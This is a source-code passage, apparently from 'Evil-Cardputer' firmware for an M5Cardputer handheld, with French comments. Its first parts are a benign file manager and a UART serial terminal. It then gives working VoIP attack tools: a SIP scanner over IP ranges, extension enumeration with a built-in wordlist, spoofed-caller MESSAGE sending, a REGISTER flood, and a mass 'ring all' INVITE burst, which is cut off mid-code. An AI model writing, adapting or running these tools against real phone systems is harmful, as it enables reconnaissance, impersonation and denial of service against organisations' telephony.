          fmCurrentPath = (slash > 0) ? fmCurrentPath.substring(0, slash) : "/";
        } else if (isFolder[fmFileCursor]) {
          /* Descendre */
          fmCurrentPath += (fmCurrentPath == "/" ? "" : "/") + sel;
          fmFileCursor      = 0;
          fmTopVisibleIndex = 0;
        } else {
          /* Fichier */
          scanFileManager((fmCurrentPath + "/" + sel).c_str());
        }

        // debounce global
        while (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
          M5Cardputer.update();
          delay(10);
        }

        break;  // recharger le rÃ©pertoire aprÃ¨s action
      }
      // â”€â”€â”€ p : PREVIEW â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
      else if (M5Cardputer.Keyboard.isKeyPressed('p')) {
        String sel = entries[fmFileCursor];
        if (!isFolder[fmFileCursor] && sel != "..")
          previewTextFile((fmCurrentPath + "/" + sel).c_str());
        refresh = true;
        delay(200);
      }
      // â”€â”€â”€ TOUCHE d : SUPPRIMER LE FICHIER AVEC CONFIRMATION â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
      else if (M5Cardputer.Keyboard.isKeyPressed('d')) {
        String sel = entries[fmFileCursor];
        if (!isFolder[fmFileCursor] && sel != "..") {
          String fullPath = fmCurrentPath + "/" + sel;
          // Appeler votre popup de confirmation
          char buf[64];
          snprintf(buf, sizeof(buf), "Delete %s ?", sel.c_str());
          if (confirmPopup(buf)) {
            // Si l'utilisateur confirme
            if (SD.exists(fullPath.c_str())) {
              if (SD.remove(fullPath.c_str())) {
                Serial.printf("Fichier supprimÃ© : %s\n", fullPath.c_str());
                // Ajuster le curseur (un Ã©lÃ©ment de moins dans la liste)
                fmFileCursor = constrain(fmFileCursor, 0, total - 2);
              }
              else {
                Serial.printf("Erreur : impossible de supprimer %s\n", fullPath.c_str());
              }
            }
            else {
              Serial.printf("Erreur : le fichier %s n'existe plus\n", fullPath.c_str());
            }
          }
          // si l'utilisateur annule, on ne fait rien
        }
        else {
          Serial.println(F("Impossible de supprimer : ce n'est pas un fichier valide."));
        }
        // Rekick pour reconstruire la liste (fichier potentiellement supprimÃ©)
        break;
      }
      // â”€â”€â”€ TOUCHE ESC : RETOUR AU MENU PRINCIPAL â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
      else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        inMenu = true;
        drawMenu();
        return;
      }

      delay(10);
    }
  }
}


void scanFileManager(const char *path) {
  // On ouvre le fichier dans currentFile
  currentFile = SD.open(path);
  if (! currentFile) {
    Serial.printf("Erreur : impossible d'ouvrir %s\n", path);
    return;
  }

  // Exemple de traitement : afficher le dÃ©but du fichier sur le port sÃ©rie
  Serial.printf("Ouverture de %s :\n", path);
  while (currentFile.available()) {
    char c = currentFile.read();
    Serial.write(c);
  }
  Serial.println(F("\n--- fin du fichier ---"));

  currentFile.close();
}






/*
============================================================================================================================
UART AutoShell
============================================================================================================================
*/
#include <ctype.h>      // isprint()
#include <deque>

/* ---------- MatÃ©riel ---------- */
HardwareSerial uartAuto(1);        // UART1 : GPIO1 RX / GPIO2 TX

/* ---------- ParamÃ¨tres patch ---------- */
constexpr size_t   UART_RX_BUF         = 4096;   // taille tampon RX matÃ©riel/driver
constexpr uint32_t FLUSH_INTERVAL_MS   = 16;     // rafraÃ®chissement Ã©cran ~60 Hz
//#define AUTOSHELL_BURST_FREEZE 1             // dÃ©commenter pour activer (optionnel)

#ifdef AUTOSHELL_BURST_FREEZE
constexpr uint32_t BURST_MS            = 50;     // fenÃªtre de dÃ©tection burst
constexpr uint32_t BURST_THRESH        = 512;    // nb octets reÃ§us dans la fenÃªtre â†’ freeze
#endif

/* ---------- Constantes ---------- */
static const int BAUD_LIST[] = {115200, 57600, 38400, 19200, 9600,
                                4800, 2400, 1200, 300};
constexpr int NB_BAUD   = sizeof(BAUD_LIST) / sizeof(BAUD_LIST[0]);
constexpr int MAX_LINES = 512;         // profondeur de l'historique

/* ---------- Variables globales ---------- */
int  autoBaud     = 115200;
bool uartShellRun = false;

/* ---------- Affichage / tampon ---------- */
std::deque<String> logBuf;
String             curLine;
int                viewTop     = 0;
bool               followEnd   = true;
int                glyphH      = 16;   // â† hauteur rÃ©elle dâ€™une ligne (px)
int                screenRows  = 0;

// Ã‰tat de flush diffÃ©rÃ©
static bool     screenDirty   = false;
static uint32_t nextFlushMs   = 0;

#ifdef AUTOSHELL_BURST_FREEZE
static uint32_t burstStartMs  = 0;
static uint32_t burstCount    = 0;
#endif

/* --------------------------------------------------------------------------
 *  Helpers internes patch
 * -------------------------------------------------------------------------- */

// Marque l'Ã©cran comme nÃ©cessitant un refresh diffÃ©rÃ©
inline void markDirty() { screenDirty = true; }

// Flush diffÃ©rÃ© : appelÃ© dans la boucle principale *aprÃ¨s* les traitements
void flushDisplayIfNeeded() {
  if (!screenDirty) return;
  uint32_t now = millis();
  if (now < nextFlushMs) return;
  M5Cardputer.Display.display();
  screenDirty = false;
  nextFlushMs = now + FLUSH_INTERVAL_MS;
}

// Drain RX en blocs pour rÃ©duire overhead par octet
void drainUART() {
  static uint8_t buf[128];
  for (;;) {
    int avail = uartAuto.available();
    if (avail <= 0) break;
    if (avail > (int)sizeof(buf)) avail = sizeof(buf);
    int got = uartAuto.readBytes(buf, avail);  // ne bloque pas car avail>0
    for (int i = 0; i < got; ++i) {
      pushChar(buf[i]);
    }
  }
}

/* --------------------------------------------------------------------------
 *  Rendu complet de la fenÃªtre (utilisÃ© seulement lors du scroll ou saut)  
 * -------------------------------------------------------------------------- */
void renderScreen() {
  M5Cardputer.Display.clear();
  M5Cardputer.Display.setTextSize(1);
  M5Cardputer.Display.setTextColor(WHITE, BLACK);
  M5Cardputer.Display.setCursor(0, 0);

  int maxTop = max(0, static_cast<int>(logBuf.size()) - screenRows);
  viewTop    = constrain(viewTop, 0, maxTop);

  for (int row = 0; row < screenRows; ++row) {
    int idx = viewTop + row;
    if (idx < (int)logBuf.size())
      M5Cardputer.Display.println(logBuf[idx]);
    else if (idx == (int)logBuf.size())
      M5Cardputer.Display.println(curLine);
    else
      M5Cardputer.Display.println();
  }
  M5Cardputer.Display.display();    // flush immÃ©diat pour un redraw total
  screenDirty = false;              // Ã©cran propre
  nextFlushMs = millis() + FLUSH_INTERVAL_MS;
}


/* --------------------------------------------------------------------------
 *  Affichage incrÃ©mental (curseur dÃ©jÃ  en bas) â€“ *sans flush immÃ©diat*
 * -------------------------------------------------------------------------- */
inline void fastPrintNoFlush(const String& s) {
  if (s == "\n")   M5Cardputer.Display.println();
  else               M5Cardputer.Display.print(s);

  // Si le curseur est sorti de lâ€™Ã©cran, on scrolle dâ€™un glyphH
  if (M5Cardputer.Display.getCursorY() >= M5Cardputer.Display.height()) {
    M5Cardputer.Display.scroll(0, -glyphH);
    M5Cardputer.Display.setCursor(0, M5Cardputer.Display.height() - glyphH);
  }
  markDirty(); // flush diffÃ©rÃ©
}

// Compat rÃ©tro â€“ si du vieux code appelle fastPrint(), rediriger
inline void fastPrint(const String& s) { fastPrintNoFlush(s); }


/* --------------------------------------------------------------------------
 * pushChar : collecte + affichage optionnel
 * -------------------------------------------------------------------------- */
void pushChar(uint8_t c) {
  if (c == '\r') return;                          // ignore CR

#ifdef AUTOSHELL_BURST_FREEZE
  // DÃ©tection rafale
  uint32_t now = millis();
  if (burstCount == 0) burstStartMs = now;
  ++burstCount;
  if (now - burstStartMs > BURST_MS) {
    burstCount = 1;            // restart fenÃªtre
    burstStartMs = now;
  } else if (burstCount > BURST_THRESH && followEnd) {
    followEnd = false;         // freeze scroll auto
  }
#endif

  if (c == '\n') {
    logBuf.push_back(curLine);
    if ((int)logBuf.size() > MAX_LINES) logBuf.pop_front();
    curLine = String();

    if (followEnd) {
      fastPrintNoFlush("\n");                    // affichage diffÃ©rÃ©
      viewTop = max(0, (int)logBuf.size() - screenRows);
    }
    return;
  }

  /* ---------- caractÃ¨res imprimables / balise <XX> ---------- */
  String toPrint;
  if (c >= 0x20)  { curLine += (char)c; toPrint = (char)c; }
  else            { char buf[6]; sprintf(buf, "<%02X>", c); curLine += buf; toPrint = buf; }

  if (followEnd) fastPrintNoFlush(toPrint);
}


void drawBaudMenu(int idx) {
  const int MENU_SZ = NB_BAUD + 1;
  M5Cardputer.Display.clear();
  M5Cardputer.Display.setTextSize(1);
  M5Cardputer.Display.setCursor(0, 0);
  M5Cardputer.Display.setTextColor(WHITE, BLACK);
  M5Cardputer.Display.println(F("Choose baudrate :"));

  for (int i = 0; i < MENU_SZ; ++i) {
    M5Cardputer.Display.print((i == idx) ? F("> ") : F("  "));
    if (i == 0)   M5Cardputer.Display.println(F("Auto-detect"));
    else          M5Cardputer.Display.printf("%d bps\n", BAUD_LIST[i - 1]);
  }
  M5Cardputer.Display.display();
  screenDirty = false;
  nextFlushMs = millis() + FLUSH_INTERVAL_MS;
}

int selectBaudMenu() {
  const int MENU_SZ = NB_BAUD + 1;
  int idx = 0, lastIdx = -1;

  for (;;) {
    if (idx != lastIdx) { drawBaudMenu(idx); lastIdx = idx; }

    M5Cardputer.update();
    auto ks = M5Cardputer.Keyboard.keysState();

    if (ks.enter)                      return (idx == 0) ? -1 : BAUD_LIST[idx - 1];
    if (M5Cardputer.Keyboard.isKeyPressed(';')) { idx = (idx + MENU_SZ - 1) % MENU_SZ; delay(120); }
    if (M5Cardputer.Keyboard.isKeyPressed('.')) { idx = (idx + 1) % MENU_SZ; delay(120); }
    if (M5Cardputer.Keyboard.isKeyPressed('`'))  return -2;

    delay(5);
  }
}

/* ---------- DÃ©tection + animation ---------- */
int detectBaud() {
  static const char spin[4] = {'|','/','-','\\'};
  uint8_t spinIdx = 0;

  M5Cardputer.Display.clear();
  M5Cardputer.Display.setCursor(0, 0);   // <<< corrigeait M5.Display.*
  M5Cardputer.Display.setTextSize(1);
  M5Cardputer.Display.setTextColor(WHITE, BLACK);
  M5Cardputer.Display.print(F("Scanning baud "));
  int spinX = M5Cardputer.Display.getCursorX();
  int spinY = M5Cardputer.Display.getCursorY();
  M5Cardputer.Display.display();

  for (int rate : BAUD_LIST) {
    M5Cardputer.Display.setCursor(spinX, spinY);
    M5Cardputer.Display.print(spin[spinIdx++ & 3]);
    M5Cardputer.Display.display();
    M5Cardputer.update();
    if (M5.getBoard() == m5::board_t::board_M5CardputerADV) {
      uartAuto.begin(rate, SERIAL_8N1, 13, 15);
      Serial.println("Detected: Cardputer-ADV");
    } else if (M5.getBoard() == m5::board_t::board_M5Cardputer) {
      uartAuto.begin(rate, SERIAL_8N1, 1, 2);
      Serial.println("Detected: Cardputer");
    } 
    unsigned long t0 = millis();
    int total = 0, printable = 0;
    while (millis() - t0 < 5000) {
      if (uartAuto.available()) {
        char c = uartAuto.read();
        total++;
        if (isprint((uint8_t)c) || c == '\r' || c == '\n') printable++;
      }
    }
    uartAuto.end();

    if (total > 30 && printable * 100 / total > 60) {
      M5Cardputer.Display.setCursor(spinX, spinY); M5Cardputer.Display.print(' ');
      M5Cardputer.Display.setCursor(0, 10);
      M5Cardputer.Display.printf("\u2192 %d bps", rate); // flÃ¨che â†’ Unicode (peut Ãªtre ignorÃ©e si police non supportÃ©e)
      M5Cardputer.Display.display();
      delay(400);
      return rate;
    }
  }
  return -1;
}

/* --------------------------------------------------------------------------
 *  Boucle interactive du shell UART (tampon circulaire, scroll Fn+;/. )
 * -------------------------------------------------------------------------- */
void startUARTShell() {
  inMenu = false;
  enterDebounce();

  /* ---------- SÃ©lection / dÃ©tection du baudrate ---------- */
  int sel = selectBaudMenu();
  if (sel == -2) { waitAndReturnToMenu("Canceled"); return; }
  autoBaud = (sel == -1) ? detectBaud() : sel;
  if (autoBaud <= 0) autoBaud = 115200;

  /* ---------- Initialisation UART ---------- */
  uartShellRun = true;
  cardgps.end();
  uartAuto.setRxBufferSize(UART_RX_BUF);                    // PATCH: agrandir tampon RX
  if (M5.getBoard() == m5::board_t::board_M5CardputerADV) {
    uartAuto.begin(autoBaud, SERIAL_8N1, 13, 15);
    Serial.println("Detected: Cardputer-ADV");
  } else if (M5.getBoard() == m5::board_t::board_M5Cardputer) {
    uartAuto.begin(autoBaud, SERIAL_8N1, 1, 2);
    Serial.println("Detected: Cardputer");
  } else {
    uartAuto.begin(autoBaud, SERIAL_8N1, 1, 2);
    Serial.println("Unknown board type");
  }
  /* ---------- Hauteur glyph + lignes visibles ---------- */
  M5Cardputer.Display.setTextSize(1);                 // police Â« Small Â»
  #if defined(M5GFX_VERSION)
    glyphH = M5Cardputer.Display.fontHeight();          // API rÃ©cente
  #else
    glyphH = 8;                                        // valeur par dÃ©faut
  #endif
  screenRows = M5Cardputer.Display.height() / glyphH;

  /* ---------- Reset tampon + bandeau ---------- */
  logBuf.clear();  curLine = "";
  viewTop = 0;  followEnd = true;

  logBuf.push_back(String("AutoShell @") + autoBaud + F(" bps  (` to quit)`"));
  curLine = "> ";
  renderScreen();

  /* ---------- Variables session ---------- */
  std::string cmd;
  bool lastEnter = false, lastBack = false;
  bool lastScrollUp = false, lastScrollDn = false;

  nextFlushMs = millis();
  screenDirty = false;

#ifdef AUTOSHELL_BURST_FREEZE
  burstCount = 0; burstStartMs = 0;
#endif

  /* ================== Boucle principale ================== */
  while (uartShellRun) {
    // 1) Lire en prioritÃ© le flux UART pour Ã©viter overflow
    drainUART();

    // 2) Mise Ã  jour M5 / clavier
    M5Cardputer.update();

    /* ----- sortie immÃ©diate avec ` ----- */
    if (M5Cardputer.Keyboard.isKeyPressed('`')) break;

    /* ----- Ã©tat clavier ----- */
    bool enterNow = M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER);
    bool backNow  = M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE);
    bool fnNow    = M5Cardputer.Keyboard.isKeyPressed(KEY_FN);
    bool upNow    = M5Cardputer.Keyboard.isKeyPressed(';');
    bool dnNow    = M5Cardputer.Keyboard.isKeyPressed('.');

    /* ---------- Scroll manuel ---------- */
    if (fnNow && upNow && !lastScrollUp) {
      followEnd = false;
      viewTop   = max(0, viewTop - 1);
      renderScreen();
    }
    if (fnNow && dnNow && !lastScrollDn) {
      int maxTop = max(0, int(logBuf.size()) - screenRows);
      if (viewTop < maxTop)  { viewTop++; renderScreen(); }
      else                   { followEnd = true; renderScreen(); }
    }
    lastScrollUp = fnNow && upNow;
    lastScrollDn = fnNow && dnNow;

    /* ---------- ENTRÃ‰E : envoi ligne ---------- */
    if (enterNow && !lastEnter) {
      for (char ch : cmd) pushChar(ch);
      pushChar('\n');
      uartAuto.write(cmd.c_str());
      uartAuto.write("\r\n");
      cmd.clear();
      curLine = "> ";
      followEnd = true;
    }

    /* ---------- BACKSPACE ---------- */
    if (backNow && !lastBack && !cmd.empty()) {
      cmd.pop_back();
      if (!curLine.isEmpty())
        curLine.remove(curLine.length() - 1, 1);

      if (followEnd) {
        M5Cardputer.Display.print("\b \b");
        markDirty();
      } else {
        renderScreen();
      }
    }
    lastBack = backNow;

    /* ---------- Saisie caractÃ¨res ---------- */
    if (M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
      auto ks = M5Cardputer.Keyboard.keysState();
      for (auto c : ks.word) {
        if ((fnNow && (c == ';' || c == '.')) || c == '`') continue;

        cmd.push_back(c);
        curLine += char(c);

        if (followEnd) {
          M5Cardputer.Display.write(c);
          markDirty();
        } else {
          renderScreen();
        }
      }
    }
    lastEnter = enterNow;

    /* ---------- UART entrant (drain complÃ©mentaire) ---------- */
    drainUART();

    // 3) Flush Ã©cran si nÃ©cessaire
    flushDisplayIfNeeded();

    delay(1);
  }

  /* ---------- Fin de session ---------- */
  if (!curLine.isEmpty()) logBuf.push_back(curLine);
  renderScreen();

  uartAuto.end();
  cardgps.begin(baudrate_gps, SERIAL_8N1, gpsRxPin, gpsTxPin);
  uartShellRun = false;
  waitAndReturnToMenu("Back to menu");
}





/*
============================================================================================================================
SIP TOOLKIT
============================================================================================================================
*/

static WiFiUDP sipUdp;
static const uint16_t SIP_PORT     = 5060;   // port SIP cible
static const uint16_t LOCAL_SIP_EP = 5062;   // port UDP local
static char  sipBuf[600];
volatile bool sipFloodStop = false;

/* ===== Helpers ======================================================= */
String genHex(uint8_t n) {
  static const char *h = "0123456789abcdef";
  String o; o.reserve(n * 2);
  for (uint8_t i = 0; i < n; ++i) {
    uint8_t v = esp_random() & 0xFF;
    o += h[v >> 4]; o += h[v & 0x0F];
  }
  return o;
}
String genBranch() { return "z9hG4bK-" + genHex(6); }
String genCallID() { return genHex(8) + "@" + WiFi.localIP().toString(); }

/* ---------- UDP TX helpers ------------------------------------------- */
void sendSIP(const IPAddress &dst, const String &pkt) {     // open+send
  sipUdp.begin(LOCAL_SIP_EP);
  sipUdp.beginPacket(dst, SIP_PORT);
  sipUdp.write((const uint8_t*)pkt.c_str(), pkt.length());
  sipUdp.endPacket();
}
void sendSIPRaw(const IPAddress &dst, const String &pkt) {  // send only
  sipUdp.beginPacket(dst, SIP_PORT);
  sipUdp.write((const uint8_t*)pkt.c_str(), pkt.length());
  sipUdp.endPacket();
}

/* ---------- RX ------------------------------------------------------- */
String readSIPResp(unsigned long tout = 500) {
  unsigned long st = millis();
  while (millis() - st < tout) {
    int len = sipUdp.parsePacket();
    if (len > 0 && len < sizeof(sipBuf)) {
      sipUdp.read(sipBuf, len); sipBuf[len] = 0;
      char *e = strchr(sipBuf, '\r'); if (!e) e = strchr(sipBuf, '\n');
      return String((char*)sipBuf, e ? e - sipBuf : len);
    }
    delay(10);
  }
  return "";
}

/* ===== Saisie clavier Cardputer â€“ UTF-8 safe ========================= */
String promptInput(const char *prompt) {
  String input = "";
  M5.Display.clear(); M5.Display.setTextSize(1.5);
  M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
  M5.Display.setCursor(5, 5); M5.Display.println(prompt);
  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);

  while (true) {
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
      auto k = M5Cardputer.Keyboard.keysState();
      for (char c : k.word) if (isPrintable(c)) input += c;
      if (k.del && input.length()) input.remove(input.length() - 1);
      if (k.enter && input.length()) return input;

      M5.Display.fillRect(0, 30, 240, 16, TFT_BLACK);
      M5.Display.setCursor(5, 30); M5.Display.print(input); M5.Display.display();
    }
    delay(20);
  }
}

/* ===== Conversions IP 32 bits / network-order ======================== */
inline uint32_t ipTo32(const IPAddress &ip) {
  return ((uint32_t)ip[0] << 24) |
         ((uint32_t)ip[1] << 16) |
         ((uint32_t)ip[2] <<  8) |
          (uint32_t)ip[3];
}
inline IPAddress ipFrom32(uint32_t v) {
  return IPAddress((v >> 24) & 0xFF,
                   (v >> 16) & 0xFF,
                   (v >>  8) & 0xFF,
                    v        & 0xFF);
}

/* ===== CIDR Parser =================================================== */
/*  parseTarget("10.0.0.0/24")  ou  "10.0.0.7"
 *  -> outNet    : adresse rÃ©seau
 *     outFirst/outLast : plage hÃ´te prÃªte Ã  itÃ©rer                    */
bool parseTarget(const String &s, uint32_t &outNet,
                 uint32_t &outFirst, uint32_t &outLast) {
  int slash = s.indexOf('/');
  IPAddress ip; uint8_t mask = 32;
  if (slash >= 0) {
    mask = s.substring(slash + 1).toInt();
    if (mask > 32) return false;
    if (!ip.fromString(s.substring(0, slash))) return false;
  } else {
    if (!ip.fromString(s)) return false;
  }

  uint32_t ip32   = ipTo32(ip);                       // *** correct endian ***
  uint32_t mask32 = (mask == 0) ? 0 : (0xFFFFFFFFUL << (32 - mask));
  outNet          = ip32 & mask32;

  if (mask == 32) {                                   // /32 = hÃ´te unique
    outFirst = outLast = ip32;
  } else {
    outFirst = outNet + 1;
    outLast  = (outNet | (~mask32)) - 1;              // exclut broadcast
  }
  return true;
}

/* =====================================================================
   1.  S I P   O P T I O N S   S C A N
   ===================================================================== */
void sipScan() {
  inMenu = false;

  String tgt = promptInput("IP ou CIDR > ");
  if (tgt.isEmpty()) { waitAndReturnToMenu("Cancelled"); return; }

  uint32_t net, first, last;
  if (!parseTarget(tgt, net, first, last)) { waitAndReturnToMenu("Bad IP/CIDR"); return; }

  sipUdp.begin(LOCAL_SIP_EP);
  uint16_t ok = 0, ko = 0;

  for (uint32_t h = first; h <= last; ++h) {
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) break;
    IPAddress dst = ipFrom32(h);

    String pkt = "OPTIONS sip:" + dst.toString() + " SIP/2.0\r\n"
                 "Via: SIP/2.0/UDP " + WiFi.localIP().toString() +
                 ";branch=" + genBranch() + ";rport\r\n"
                 "From: \"Evil-Cardputer\" <sip:scan@" + WiFi.localIP().toString() + ">;tag=1\r\n"
                 "To: <sip:" + dst.toString() + ">\r\n"
                 "Call-ID: " + genCallID() + "\r\nCSeq: 1 OPTIONS\r\n"
                 "Max-Forwards: 70\r\nUser-Agent: Evil-Cardputer/1.4.3\r\n"
                 "Content-Length: 0\r\n\r\n";

    sendSIPRaw(dst, pkt);

    String resp = readSIPResp();
    (resp.startsWith("SIP/2.0 200") ? ok : ko)++;

    Serial.printf("[SIP-RX] %s - %s\n", dst.toString().c_str(), resp.c_str());
    M5.Display.fillRect(0, 100, 240, 12, menuBackgroundColor);
    M5.Display.setCursor(5, 100);
    M5.Display.printf("OK:%u  KO:%u", ok, ko); M5.Display.display();
  }
  sipUdp.stop();
  waitAndReturnToMenu("Scan done  OK:" + String(ok) + "  KO:" + String(ko));
}


/* ======================================================================
   2.  ENUM (INVITE)
   ====================================================================== */

void sipEnumExtensions() {
  /* ---------- saisie paramÃ¨tres ---------- */
  IPAddress pbx;
  String ip = promptInput("PBX IP > ");
  if (!pbx.fromString(ip)) { waitAndReturnToMenu("Bad IP"); return; }

  String mode = promptInput("Mode: 1=Range  2=Wordlist > ");

  /* ---------- prÃ©paration affichage ---------- */
  constexpr int  lineH   = 14;
  constexpr int  yStart  = 16;
  const     int  yMax    = M5.Display.height() - lineH;
  int yCursor           = yStart;

  M5.Display.clear();
  M5.Display.setTextSize(1.5);
  M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
  M5.Display.setCursor(5, 5);  M5.Display.println("Enum runningâ€¦");

  M5.Display.startWrite();                       // Ã©vite le scintillement

  uint16_t found = 0;

  auto printLine = [&](const String& txt)
  {
    if (yCursor > yMax) {                        // scroll doux dâ€™une ligne
      M5.Display.scroll(0, -lineH);
      yCursor = yMax;
      M5.Display.fillRect(0, yCursor, M5.Display.width(), lineH, TFT_BLACK);
    }
    M5.Display.setCursor(5, yCursor);
    M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
    M5.Display.println(txt);
    yCursor += lineH;
  };

  /* ---------- test dâ€™une extension ---------- */
  auto sendInviteAndCheck = [&](const String& ext) {
    String pkt = "INVITE sip:" + ext + "@" + ip + " SIP/2.0\r\n"
                 "Via: SIP/2.0/UDP " + WiFi.localIP().toString() +
                 ";branch=" + genBranch() + "\r\n"
                 "From: \"Enum\" <sip:enum@" + WiFi.localIP().toString() + ">;tag=2\r\n"
                 "To: <sip:" + ext + "@" + ip + ">\r\n"
                 "Call-ID: " + genCallID() + "\r\n"
                 "CSeq: 1 INVITE\r\n"
                 "Contact: <sip:enum@" + WiFi.localIP().toString() + ">\r\n"
                 "Max-Forwards: 70\r\nContent-Length: 0\r\n\r\n";

    sendSIP(pbx, pkt);
    String r = readSIPResp(500);

    /* garde uniquement la premiÃ¨re ligne ex : â€œSIP/2.0 401 Unauthorizedâ€ */
    String status = r.substring(0, r.indexOf('\r') >= 0 ? r.indexOf('\r')
                                                        : r.indexOf('\n'));

    if (status.startsWith("SIP/2.0 401") ||
        status.startsWith("SIP/2.0 403") ||
        status.startsWith("SIP/2.0 407"))
    {
      found++;
      Serial.printf("[+] EXT %s exists  ->  %s\n", ext.c_str(), status.c_str());
      printLine("Found " + ext + " -> " + status);
    }
  };

  /* ---------- mode 1 : plage numÃ©rique ---------- */
  if (mode == "1") {
    uint16_t deb = promptInput("Start ext > ").toInt();
    uint16_t fin = promptInput("End ext > ").toInt();
    for (uint16_t e = deb; e <= fin; ++e) { sendInviteAndCheck(String(e)); delay(40); }

  /* ---------- mode 2 : word-list intÃ©grÃ©e ---------- */
  } else if (mode == "2") {
    static const char* const extList[] = {
      /* Asterisk / FreePBX */ "100","101","102","199","200","201","202","299",
      "*97","*98","*43","*60","*65","*69","#","555","700","701",
      /* 3CX */ "7000","7777","8888","9999",
      /* Cisco CUCM */ "5900","5901","7777","9900","9999",
      /* Yeastar */ "1000","1001","1002",
      /* noms frÃ©quents */ "admin","operator","reception","support",
      "voicemail","alice","bob","guest","test","accueil", nullptr
    };
    for (uint8_t i = 0; extList[i]; ++i) { sendInviteAndCheck(extList[i]); delay(40); }

  } else {
    M5.Display.endWrite();
    waitAndReturnToMenu("Invalid mode");
    return;
  }

  /* ---------- fin ---------- */
  M5.Display.endWrite();
  waitAndReturnToMenu(String("Enum done â€“ ") + found + " valid");
}


/* ======================================================================
   3.  MESSAGE Spoof
   ====================================================================== */

void sipSpoofMessage() {
  inMenu = false;
  IPAddress pbx; String ip = promptInput("PBX IP > "); if (!pbx.fromString(ip)) {
    waitAndReturnToMenu("Bad IP");
    return;
  }
  String dst = promptInput("Dest ext > "), fake = promptInput("Caller name > "), txt = promptInput("Text > ");
  String body = txt + "\r\n";
  String pkt = "MESSAGE sip:" + dst + "@" + ip + " SIP/2.0\r\n"
               "Via: SIP/2.0/UDP " + WiFi.localIP().toString() + ";branch=" + genBranch() + "\r\n"
               "From: \"" + fake + "\" <sip:" + fake + "@example.com>;tag=3\r\n"
               "To: <sip:" + dst + "@" + ip + ">\r\n"
               "Call-ID: " + genCallID() + "\r\nCSeq: 1 MESSAGE\r\nMax-Forwards: 70\r\n"
               "Content-Type: text/plain\r\nContent-Length: " + String(body.length()) + "\r\n\r\n" + body;
  sendSIP(pbx, pkt);
  String resp = readSIPResp(); waitAndReturnToMenu(resp == "" ? "No answer" : resp);
}

/* ======================================================================
   4.  R E G I S T E R   F L O O D
   ====================================================================== */
void sipFlood() {
  inMenu = false; sipFloodStop = false;

  String tgt = promptInput("IP ou CIDR > ");
  if (tgt.isEmpty()) { waitAndReturnToMenu("Cancelled"); return; }

  uint32_t net, first, last;
  if (!parseTarget(tgt, net, first, last)) { waitAndReturnToMenu("Bad IP/CIDR"); return; }

  uint8_t pps = promptInput("Pkts/sec (1-50) > ").toInt();
  uint32_t delayUS = 1000000UL / pps;

  sipUdp.begin(LOCAL_SIP_EP);
  uint32_t tot = 0;

  M5.Display.clear();
  M5.Display.println("FLOOD - BACKSPACE to stop"); M5.Display.display();

  for (uint32_t h = first; h <= last && !sipFloodStop; ++h) {
    IPAddress dst = ipFrom32(h);

    String pkt = "REGISTER sip:" + dst.toString() + " SIP/2.0\r\n"
                 "Via: SIP/2.0/UDP " + WiFi.localIP().toString() +
                 ";branch=" + genBranch() + ";rport\r\n"
                 "From: <sip:flood@" + WiFi.localIP().toString() + ">;tag=F\r\n"
                 "To: <sip:flood@" + dst.toString() + ">\r\n"
                 "Call-ID: " + genCallID() + "\r\nCSeq: 1 REGISTER\r\n"
                 "Contact: <sip:flood@" + WiFi.localIP().toString() + ">\r\n"
                 "Max-Forwards: 70\r\nContent-Length: 0\r\n\r\n";

    unsigned long t0 = micros();
    while ((micros() - t0) < 1000000UL && !sipFloodStop) {
      sendSIPRaw(dst, pkt); tot++;
      delayMicroseconds(delayUS);
      M5Cardputer.update();
      if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) sipFloodStop = true;
    }
    M5.Display.fillRect(0, 90, 240, 12, menuBackgroundColor);
    M5.Display.setCursor(5, 90);
    M5.Display.printf("%s tot:%u", dst.toString().c_str(), tot); M5.Display.display();
  }
  sipUdp.stop();
  waitAndReturnToMenu(sipFloodStop ? "Flood aborted" : "Sent " + String(tot));
}


/* ======================================================================
   5.  R I N G   A L L
   ====================================================================== */
void sipRingAll() {
  inMenu = false;

  String tgt = promptInput("CIDR ex 192.168.1.0/24 > ");
  if (tgt.isEmpty()) { waitAndReturnToMenu("Cancelled"); return; }

  uint32_t net, first, last;
  if (!parseTarget(tgt, net, first, last)) { waitAndReturnToMenu("Bad CIDR"); return; }

  uint16_t ringSec = promptInput("Ring duration s (5) > ").toInt();
  if (ringSec == 0) ringSec = 5;
  bool addSDP = promptInput("Add SDP ? y/N > ").startsWith("y");

  sipUdp.begin(LOCAL_SIP_EP);
  struct CallMeta { IPAddress ip; String branch; String callid; };
  std::vector<CallMeta> dlg;

  /* ---------- burst INVITE ---------- */
  for (uint32_t h = first; h <= last; ++h) {
    IPAddress dst = ipFrom32(h);

    String branch = genBranch();
    String callid = genCallID();

    String sdp = "v=0\r\no=- 0 0 IN IP4 " + WiFi.localIP().toString() +
                 "\r\ns=Ring\r\nc=IN IP4 " + WiFi.localIP().toString() +
                 "\r\nt=0 0\r\nm=audio 0 RTP/AVP 0\r\n";

    String pkt = "INVITE sip:" + dst.toString() + "@" + dst.toString() + " SIP/2.0\r\n"
                 "Via: SIP/2.0/UDP " + WiFi.localIP().toString() +
                 ";branch=" + branch + ";rport\r\n"
                 "From: \"Broadcast\" <sip:ring@" + WiFi.localIP().toString() + ">;tag=R\r\n"
                 "To: <sip:" + dst.toString() + "@" + dst.toString() + ">\r\n"
